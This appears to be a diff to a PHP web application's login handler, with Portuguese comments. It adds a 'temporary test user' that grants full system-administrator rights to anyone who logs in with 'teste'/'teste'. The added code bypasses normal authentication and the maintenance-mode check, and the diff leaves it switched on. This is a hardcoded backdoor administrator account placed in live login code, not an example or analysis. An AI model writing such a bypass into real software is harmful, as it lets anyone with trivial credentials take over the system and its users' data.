@@ -2334,6 +2334,35 @@ switch ($requestUri) {
                 'redirect' => '/dashboard',
             ]);
         }
+
+        // ──────────────────────────────────────────────
+        // USUÁRIO DE TESTE TEMPORÁRIO (full access)
+        // Desativar: mudar $TEST_USER_ENABLED para false
+        // ──────────────────────────────────────────────
+        $TEST_USER_ENABLED = true;
+        if ($TEST_USER_ENABLED && $matricula === 'teste' && $password === 'teste') {
+            $_SESSION['force_system_admin'] = true;
+            $_SESSION['usuario_logado'] = [
+                'id' => 999999,
+                'nome_historico' => 'teste',
+                'nome_completo' => 'Usuário de Teste',
+                'cargo' => 'admin',
+                'cargo_principal' => 'admin',
+                'cargos' => ['admin'],
+                'ativo' => true,
+                'is_system_admin' => true,
+            ];
+            $_SESSION['usuario_id'] = 999999;
+            $_SESSION['usuario_nome'] = 'teste';
+            $syncSessionRoles($_SESSION['usuario_logado']);
+
+            JsonResponse::send([
+                'ok' => true,
+                'mode' => 'legacy',
+                'redirect' => '/dashboard',
+            ]);
+        }
+
         // Se o sistema não estiver online, e o login for de um obreiro comum (não o admin do sistema), rejeita.
         $sistemaStatus = 'online';
         $manutencaoMsg = 'O sistema está em manutenção técnica programada. Retornaremos em breve.';
